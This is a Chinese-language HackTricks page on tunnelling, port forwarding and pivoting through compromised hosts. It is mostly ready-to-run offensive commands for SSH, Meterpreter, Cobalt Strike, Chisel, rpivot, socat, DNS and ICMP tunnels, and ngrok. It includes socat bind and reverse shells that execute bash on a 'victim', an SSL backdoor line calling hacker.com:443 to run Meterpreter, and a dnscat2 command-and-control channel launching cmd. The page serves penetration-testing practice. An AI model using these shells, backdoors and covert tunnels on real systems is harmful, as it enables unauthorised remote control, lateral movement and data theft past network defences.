# 隧道和端口转发

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中做广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

## Nmap提示

{% hint style="warning" %}
**ICMP**和**SYN**扫描无法通过socks代理进行隧道传输，因此我们必须**禁用ping发现**（`-Pn`）并指定**TCP扫描**（`-sT`）才能使其正常工作。
{% endhint %}

## **Bash**

**主机 -> 跳板 -> 内部A -> 内部B**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH图形连接（X）
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### 本地端口到端口

在SSH服务器中打开新端口 --> 其他端口
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### 端口到端口

本地端口 --> 受损主机（SSH） --> 第三台主机:端口
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 受损主机（SSH） --> 任何地方
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 反向端口转发

这对通过 DMZ 从内部主机获取反向 shell 非常有用：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN隧道

您需要在**两台设备上都有root权限**（因为您将要创建新的接口），并且sshd配置必须允许root登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
在服务器端启用转发。
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端上设置新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

您可以通过**ssh**将所有**流量**通过主机**隧道**到一个**子网络**。\
例如，转发所有流向 10.10.10.0/24 的流量
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### 端口到端口

本地端口 --> 受损主机（活动会话） --> 第三台主机:端口
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

SOCKS代理是一种网络协议，允许客户端通过防火墙或NAT网关连接到服务器。 SOCKS可以用于隧道和端口转发，为用户提供匿名性和安全性。
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS代理

在teamserver中打开一个端口，监听所有可以用来**通过beacon路由流量**的接口。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，流量被发送到团队服务器，然后再转发到指定的主机:端口
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port 本地

{% hint style="warning" %}
在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，**流量被发送到钴蓝打击客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口。
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

您需要上传一个Web文件隧道：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

您可以从[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)的发布页面下载\
您需要为客户端和服务器使用**相同的版本**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

反向隧道。隧道从受害者端启动。\
在 127.0.0.1:1080 上创建一个 socks4 代理。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过**NTLM代理**进行中继
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 绑定 shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### 反向 shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### 端口到端口
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 通过socks进行端口到端口的转发
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 进行 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
您可以绕过**未经身份验证的代理**，在受害者控制台中执行以下代码行，而不是最后一个代码行：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh 控制台**

在客户端和服务器端创建证书
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### 远程端口到端口

将本地SSH端口（22）连接到攻击者主机的443端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

这就像是控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。

由于这个二进制文件将在受害者中执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便我们可以建立一个反向连接。然后，只需将本地可访问的端口转发到我们机器上的一个端口：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### 端口到端口

您需要是本地管理员（对于任何端口）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

您需要**通过系统获得RDP访问权限**。\
下载：

1. [SocksOverRDP x64 二进制文件](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用Windows远程桌面服务功能中的`Dynamic Virtual Channels` (`DVC`)。DVC负责**在RDP连接上进行数据包隧道传输**。
2. [Proxifier 便携版二进制文件](https://www.proxifier.com/download/#win-tab)

在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以使用`mstsc.exe`连接到受害者的RDP，并且我们应该收到一个提示，表示SocksOverRDP插件已启用，并且它将在127.0.0.1:1080上监听。

通过RDP连接并在受害者机器上上传并执行`SocksOverRDP-Server.exe`二进制文件：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在您的机器（攻击者）上确认端口1080正在监听：
```
netstat -antb | findstr 1080
```
现在您可以使用[**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**

## 通过Proxifier代理Windows GUI应用程序

您可以使用[**Proxifier**](https://www.proxifier.com/)使Windows GUI应用程序通过代理导航。\
在**Profile -> Proxy Servers**中添加SOCKS服务器的IP和端口。\
在**Profile -> Proxification Rules**中添加要代理的程序名称以及要代理的IP连接。

## NTLM代理绕过

前面提到的工具：**Rpivot**\
**OpenVPN**也可以绕过它，设置配置文件中的这些选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它对代理进行身份验证，并在本地绑定一个端口，该端口被转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
例如，将端口443转发。
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，如果你在受害者设备上将 **SSH** 服务设置为监听端口443。你可以通过攻击者端口2222 连接到它。\
你也可以使用一个 **meterpreter** 连接到本地主机:443，而攻击者在端口2222上监听。

## YARP

由微软创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS 隧道

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

在两个系统中都需要 root 权限来创建 tun 适配器，并使用 DNS 查询在它们之间传输数据。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
隧道速度会很慢。您可以通过以下方式在该隧道上创建一个压缩的SSH连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**从这里下载**](https://github.com/iagox86/dnscat2)**。**

通过 DNS 建立 C\&C 通道。不需要 root 权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

您可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 客户端：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用dnscat进行端口转发**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains DNS

Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道传输 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。

## Go 中的隧道

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP 隧道

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

在两个系统中都需要 root 权限来创建 tun 适配器，并使用 ICMP 回显请求在它们之间隧道数据。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/)是一个工具，可以通过一条命令将解决方案暴露到互联网。**
*暴露的URI类似于:* **UID.ngrok.io**

### 安装

- 创建一个账户：https://ngrok.com/signup
- 客户端下载：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*如果需要的话，也可以添加身份验证和TLS。*

#### TCP隧道
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 通过HTTP公开文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### 拦截HTTP调用

*用于XSS、SSRF、SSTI ...*
直接从stdout或在HTTP接口[http://127.0.0.1:4040](http://127.0.0.1:4000)中。
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml简单配置示例

它打开了3个隧道：
- 2个TCP
- 1个HTTP，从/tmp/httpbin/暴露静态文件
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## 其他检查工具

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中被广告**？ 或者您想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* 获取[**官方PEASS和HackTricks衣服**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
